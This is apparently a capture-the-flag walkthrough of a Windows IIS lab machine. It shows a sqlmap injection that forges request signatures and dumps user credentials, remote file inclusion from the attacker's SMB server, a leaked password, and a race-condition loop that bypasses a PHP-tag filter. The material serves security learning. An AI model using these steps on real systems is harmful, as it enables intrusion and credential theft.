<!-- 6/100 -->

# NMAP
```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: OS Tidy Inc.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Enumeration

## WEB

![image](https://user-images.githubusercontent.com/68326057/120888743-aa618f80-c617-11eb-8f49-a5972146bc3e.png)

![image](https://user-images.githubusercontent.com/68326057/120888770-ce24d580-c617-11eb-8bea-7b17c4a072f2.png)


USERS:-
```bash
dustin
daksh
anna
wafer
```

Dir Found
```bash
/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b
```

![image](https://user-images.githubusercontent.com/68326057/120888945-910d1300-c618-11eb-841f-5944e9dd5810.png)

![image](https://user-images.githubusercontent.com/68326057/120889040-ff51d580-c618-11eb-8225-d2eaff9b8b97.png)


Login Portal

![image](https://user-images.githubusercontent.com/68326057/120889053-0d9ff180-c619-11eb-8fc0-228d357def7f.png)

/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b

I tested the 'h' parameter hash.

![image](https://user-images.githubusercontent.com/68326057/120889178-8d2dc080-c619-11eb-8f01-dc67f01939d9.png)

I used sqlmap to test it.

![image](https://user-images.githubusercontent.com/68326057/120889337-34125c80-c61a-11eb-9edf-3ba27e539882.png)

![image](https://user-images.githubusercontent.com/68326057/120889791-6fae2600-c61c-11eb-998c-0681ff2a6f4c.png)

Everytime I test another table other than licenses then 403 error occours.

![image](https://user-images.githubusercontent.com/68326057/120890022-de3fb380-c61d-11eb-8e98-baef856bc2b2.png)

![image](https://user-images.githubusercontent.com/68326057/120890730-42fd0d00-c622-11eb-8370-6d24837b4f78.png)

![image](https://user-images.githubusercontent.com/68326057/120891417-2f53a580-c626-11eb-88c4-aa7bb83baaad.png)

```bash
sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b" --eval="import hashlib ; h=hashlib.md5(('hie0shah6ooNoim'+order).encode('utf-8')).hexdigest()"  --batch --dump 
```

```bash

+----+------------------------------+----------------------------------------------+----------------------+
| id | login                        | password                                     | customer_name        |
+----+------------------------------+----------------------------------------------+----------------------+
| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | Vikki Solomon        |
| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 (password2) | Neave Stone          |
| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e (123456)    | Bertie McEachern     |
| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b (12345)     | Jordana Kleiser      |
| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b (123456789) | Mariellen Chasemore  |
| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  | Gwyneth Dornin       |
| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou)  | Israel Tootell       |
| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a (princess)  | Karon Mangham        |
| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 (1234567)   | Janifer Blinde       |
| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c (rockyou)   | Laurens Lenchenko    |
| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad (12345678)  | Andreana Austin      |
| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 (abc123)    | Arnold Feldmesser    |
| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd (nicole)    | Adella Huntar        |
| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel)    | Trudi Alelsandrovich |
| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 (babygirl)  | Ivy Shay             |
| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 (monkey)    | Alys Callaby         |
| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 (lovely)    | Dorena Aery          |
| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 (jessica)   | Amble Alekseicik     |
| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 (654321)    | Lin Ginman           |
| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f (michael)   | Letty Giorio         |
| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee (ashley)    | Lazarus Bysh         |
| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)    | Bud Klewer           |
| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 (111111)    | Woodrow Strettell    |
| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 (iloveu)    | Lila O Doran         |
| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd (000000)    | Bibbie Pfeffel       |
| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 (michelle)  | Luce Grimsdell       |
| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f (tigger)    | Lyle Pealing         |
| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 (sunshine)  | Kimmy Russen         |
| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d (chocolate) | Meg Eastmond         |
+----+------------------------------+----------------------------------------------+----------------------+
```

Login in licenses with any of these:-

![image](https://user-images.githubusercontent.com/68326057/120894668-4b137780-c637-11eb-8500-ee50bf8e2c01.png)

Again some kind of hash

I created my hash
```bash
python3 -c "import hashlib ; h=hashlib.md5(('hie0shah6ooNoim'+'test.php').encode('utf-8')).hexdigest();print(h)"
989ff42873929244399f8c31da17ffd9
```

--> view-source:http://10.10.10.231/licenses/licenses.php?theme=test.php&h=989ff42873929244399f8c31da17ffd9

![image](https://user-images.githubusercontent.com/68326057/120895085-0ee11680-c639-11eb-8304-57d8bf4e52bd.png)


```bash
<!-- [2] file_get_contents(test.php/header.inc): failed to open stream: No such file or directory
On line 35 in file C:\inetpub\wwwroot\functions.php
 30 |  
 31 | // Following function securely includes a file. Whenever we 
 32 | // will encounter a PHP tag we will just bail out here. 
 33 | function secure_include($file) { 
 34 |   if (strpos(file_get_contents($file),'<?') === false) {                <<<<< Error encountered in this line.
 35 |     include($file); 
 36 |   } else { 
 37 |     http_response_code(403); 
 38 |     die('Forbidden - Tampering attempt detected.'); 
 39 |   } 
 40 | } 
// -->
<!-- [2] include(test.php/header.inc): failed to open stream: No such file or directory
On line 36 in file C:\inetpub\wwwroot\functions.php
 31 | // Following function securely includes a file. Whenever we 
 32 | // will encounter a PHP tag we will just bail out here. 
 33 | function secure_include($file) { 
 34 |   if (strpos(file_get_contents($file),'<?') === false) { 
 35 |     include($file);                <<<<< Error encountered in this line.
 36 |   } else { 
 37 |     http_response_code(403); 
 38 |     die('Forbidden - Tampering attempt detected.'); 
 39 |   } 
 40 | } 
 41 |  
// -->
<!-- [2] include(): Failed opening 'test.php/header.inc' for inclusion (include_path='.;C:\php\pear')
On line 36 in file C:\inetpub\wwwroot\functions.php
 31 | // Following function securely includes a file. Whenever we 
 32 | // will encounter a PHP tag we will just bail out here. 
 33 | function secure_include($file) { 
 34 |   if (strpos(file_get_contents($file),'<?') === false) { 
 35 |     include($file);                <<<<< Error encountered in this line.
 36 |   } else { 
 37 |     http_response_code(403); 
 38 |     die('Forbidden - Tampering attempt detected.'); 
 39 |   } 
 40 | } 
 41 |  
// -->
```

So we Can use RFI here


--> view-source:http://10.10.10.231/licenses/licenses.php?theme=http://10.10.14.54:8000/test.php&h=e2c392ed24821be91164dbc446d4d623


![image](https://user-images.githubusercontent.com/68326057/120895528-f8d45580-c63a-11eb-9aed-645a0d8a2f30.png)

![image](https://user-images.githubusercontent.com/68326057/120895535-01c52700-c63b-11eb-8a4d-7c13af0960d2.png)

I created a directory test.php

![image](https://user-images.githubusercontent.com/68326057/120895662-b101fe00-c63b-11eb-87b9-1a5fa78d6822.png)

![image](https://user-images.githubusercontent.com/68326057/120895672-b8290c00-c63b-11eb-9cfd-957bfb44c198.png)

--> view-source:http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.54/test&h=d7c35c7414455d834b6ad94dba025db0

I started my smb server:-

```bash
sudo python3 /opt/impacket/examples/smbserver.py -ip 10.10.14.54 -smb2support evil .
```

![image](https://user-images.githubusercontent.com/68326057/120898704-a0f11b00-c649-11eb-87ab-073ca4da2709.png)

![image](https://user-images.githubusercontent.com/68326057/120899473-8751d280-c64d-11eb-988c-f9f6c7d101ef.png)

```bash
web:charlotte123!
```

```bash
<?php

phpinfo();

?>
```

![image](https://user-images.githubusercontent.com/68326057/120899699-9e44f480-c64e-11eb-8f00-8dc248c14cf9.png)

So we have to make a script , when it open our file there is normal content and it put php code soon after that.

## Race Condition

```bash
while true;

do echo "testing" > header.inc;
echo "<?php phpinfo(); ?>" > header.inc;
done;
```

--> http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.54/evil&h=2f8c7045679a70dd46df466048eca782

![image](https://user-images.githubusercontent.com/68326057/120900250-80c55a00-c651-11eb-90ce-0262f0bd827d.png)

;_; finally




